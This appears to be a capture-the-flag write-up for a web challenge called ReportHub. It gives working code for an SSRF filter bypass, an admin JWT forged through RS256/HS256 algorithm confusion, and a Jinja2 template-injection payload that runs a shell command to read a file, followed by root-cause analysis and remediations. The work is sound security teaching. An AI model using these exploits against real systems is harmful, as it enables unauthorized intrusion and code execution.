# ReportHub (Web Exploitation, Hard)

**Author:** Aryan Bansode  
**Category:** Web Exploitation  
**Difficulty:** Hard

## Challenge Description

> ReportHub is a tiny internal tool: paste a URL, and it'll fetch the content and save it as a report for you. Simple, right? Find out what else is reachable from inside.

## Summary

The target exposes a public-facing service, `public-app`, that lets visitors import a URL and view the fetched content as a report. Its SSRF filter blocks private or loopback IP literals and a handful of literal hostnames, but it does not resolve or validate ordinary hostnames. As a result, the internal-only `internal-admin` service can be reached through its Docker service name.

The internal service exposes an RSA public key intended for RS256 verification, but accepts both RS256 and HS256 using the same key material. This algorithm-confusion flaw permits a forged admin token. The token unlocks an endpoint that passes attacker-controlled input to Flask's unsandboxed `render_template_string`, creating an SSTI-to-RCE chain.

All stages after the first must be routed through the public app's blind GET proxy. In the session-isolated version, the same session cookie must be retained throughout the chain.

---

## Step 1 — Reconnaissance

Browse to the target instance:

```text
http://<target-host>:5000/
```

The landing page shows **ReportHub**, a form that fetches a URL and stores the response as a report.

Viewing `/static/main.js` reveals a leftover developer comment:

```javascript
// TODO(dave): remove before prod — was testing the health check proxy
// against the internal admin service directly:
//   http://internal-admin:9000/health
```

This identifies a second, internal-only service named `internal-admin`, listening on port `9000` on the same Docker network.

---

## Step 2 — Bypass the SSRF Filter

A direct attempt to reach a loopback address is blocked:

```http
POST /reports
url=http://127.0.0.1:9000/health
```

Response:

```text
400 Bad Request — That host is not allowed.
```

The filter checks IP literals against private, loopback, link-local, and reserved ranges, but does not resolve or validate ordinary hostnames. Using the Docker service name bypasses the check:

```http
POST /reports
url=http://internal-admin:9000/health
```

Response:

```text
302 → /reports/1
{"status": "ok", "service": "internal-admin"}
```

The SSRF is confirmed. In the session-isolated build, preserve the same cookie jar for this and every subsequent request. Report storage is keyed per session, so requests without persistent cookies may not be able to access their own imported reports.

---

## Step 3 — Retrieve the Internal RSA Public Key

Reuse the SSRF primitive to request the internal service's public-key endpoint:

```text
http://internal-admin:9000/publickey
```

Submit this URL through `POST /reports`. The resulting report contains a PEM-encoded RSA public key. The internal service publishes it so other internal services can verify RS256 tokens.

---

## Step 4 — Forge an Admin Token Through JWT Algorithm Confusion

The internal service verifies tokens with:

```python
jwt.decode(token, key=VERIFY_KEY, algorithms=["RS256", "HS256"])
```

Here, `VERIFY_KEY` is the DER-encoded byte representation of the public key retrieved in Step 3.

The vulnerability is accepting both an asymmetric algorithm (RS256) and a symmetric algorithm (HS256) against the same key material. With HS256, the key is a shared secret, so someone who obtains those bytes can create a token claiming `role: admin`.

A straightforward attempt with PyJWT fails:

```python
jwt.encode({"role": "admin"}, der_bytes, algorithm="HS256")
```

PyJWT raises an `InvalidKeyError` because it recognizes that the bytes represent an asymmetric key or certificate and refuses to use them as an HMAC secret. The target, however, has no equivalent protection and uses the key bytes directly with HMAC.

The write-up's manual token construction is:

```python
import hmac, hashlib, base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")

header = {"alg": "HS256", "typ": "JWT"}
payload = {"role": "admin"}

signing_input = (
    b64url(json.dumps(header, separators=(",", ":")).encode()) + b"." +
    b64url(json.dumps(payload, separators=(",", ":")).encode())
)

sig = hmac.new(der_bytes, signing_input, hashlib.sha256).digest()
forged_token = (signing_input + b"." + b64url(sig)).decode()
```

This creates a token that the vulnerable internal service accepts as a `role: admin` credential.

---

## Step 5 — Exploit SSTI Through the SSRF Proxy

The internal `/admin/render` endpoint checks the token and then renders the supplied template without a sandbox:

```python
claims = jwt.decode(token, key=VERIFY_KEY, algorithms=["RS256", "HS256"])
if claims.get("role") != "admin":
    return "forbidden", 403

rendered = render_template_string(request.args.get("template", ""))
```

Because the public SSRF primitive only performs GET requests, the forged token and template payload must be passed as URL-encoded query parameters in a nested request.

The supplied payload is:

```python
import urllib.parse

ssti_payload = (
    "{{ self.__init__.__globals__.__builtins__."
    "__import__('os').popen('cat /flag.txt').read() }}"
)

inner_url = (
    "http://internal-admin:9000/admin/render"
    f"?token={urllib.parse.quote(forged_token, safe='')}"
    f"&template={urllib.parse.quote(ssti_payload, safe='')}"
)
```

Submit `inner_url` as the `url` value to `POST /reports`, while retaining the same session cookie used in previous stages.

---

## Step 6 — Recover the Flag

The report returned by the public app contains the output from the internal template-rendering endpoint:

```text
flag{alg_c0nfus10n_ssrf_ssti_ch41n_ftw}
```

The chain is complete: SSRF reaches the internal service, JWT algorithm confusion forges an admin token, and unsandboxed template rendering leads to command execution.

---

## Flag

```text
flag{alg_c0nfus10n_ssrf_ssti_ch41n_ftw}
```

---

## Root Cause Analysis

### 1. Incomplete SSRF Filtering

The blocklist validates IP literals against private and loopback ranges but does not resolve or check ordinary hostnames. This leaves Docker-internal service names such as `internal-admin` unguarded.

### 2. JWT Algorithm Confusion

The verifier accepts both RS256 and HS256 against the same key material. Because HS256 uses a symmetric secret, someone who can obtain the public-key bytes can forge a token that the server accepts as an admin credential.

### 3. Unsandboxed Server-Side Template Rendering

Passing attacker-controlled input to `render_template_string` gives the input access to Jinja2's default unsandboxed template environment, potentially allowing arbitrary Python execution.

### 4. Defense-in-Depth Failure

The internal service was intended to be unreachable from outside the Docker network. However, the SSRF flaw lets the public app make requests on an attacker's behalf, bridging that boundary and chaining the internal weaknesses into an externally triggerable RCE path.

---

## Remediations

1. **Validate and resolve hostnames.** Check resolved addresses against private, loopback, link-local, and other restricted ranges. Revalidate destinations after redirects.
2. **Pin JWT verification to one expected algorithm.** Use only the intended algorithm, such as `algorithms=["RS256"]`, rather than accepting multiple algorithm families against the same key material.
3. **Separate cryptographic key usage.** Never reuse asymmetric public-key material as an HMAC secret elsewhere in the system.
4. **Avoid rendering untrusted templates.** Do not pass unsanitized input to `render_template_string` or other template-from-string APIs. Prefer fixed templates with user data passed as context.
5. **Use network segmentation as defense in depth.** Restrict which services can reach internal components; do not rely on network isolation as the only security control.
6. **Apply least privilege.** Limit the public-facing app's access to internal services and sensitive files.

---

## Tools Used

- **Browser / `curl`:** Manual HTTP requests and page-source inspection.
- **Python:** `requests`, `cryptography`, `hmac`, and `hashlib` for proxy calls, PEM-to-DER conversion, and JWT construction.
- **`requests.Session()`:** Persistent session cookies across the exploitation chain.

---

## Timeline

| Step | Action | Result |
|---:|---|---|
| 1 | Open `/static/main.js` | Discovered internal hostname `internal-admin:9000` |
| 2 | Request `http://internal-admin:9000/health` through `/reports` | Confirmed SSRF filter bypass for plain hostnames |
| 3 | Request `http://internal-admin:9000/publickey` through `/reports` | Retrieved the RSA public key |
| 4 | Construct an HS256 token using the DER-encoded public key bytes | Forged a `role: admin` token |
| 5 | Send a nested request to `/admin/render` through the SSRF proxy | SSTI payload executes and the flag is returned |

---

## Tools and Concepts

- Server-Side Request Forgery (SSRF)
- JWT algorithm confusion (RS256 / HS256)
- Server-Side Template Injection (SSTI)
- Remote Code Execution (RCE)
- Docker service-name resolution
- Session-cookie persistence

---

## Disclaimer

This challenge write-up is intended for educational and authorized cybersecurity testing. Do not use these techniques against systems or applications without explicit permission.
